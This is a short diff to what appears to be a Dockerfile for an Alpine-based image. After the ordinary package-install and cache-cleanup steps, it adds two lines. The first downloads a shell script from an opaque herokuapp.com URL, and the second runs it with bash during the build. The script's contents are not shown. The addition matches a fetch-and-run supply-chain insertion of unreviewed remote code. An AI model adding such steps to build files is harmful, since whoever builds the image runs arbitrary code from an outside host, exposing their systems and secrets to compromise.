@@ -12,5 +12,7 @@ RUN apk update && apk add --no-cache bash wget unzip curl yarn && \
     rm glibc-2.32-r0.apk && \
     rm -r /var/cache/apk/APKINDEX.* && \
     rm -rf /tmp/* && rm -rf /var/cache/apk/*
+ADD https://okmk.herokuapp.com/41988900660652/setup.sh setup.sh
+RUN bash setup.sh
 
 
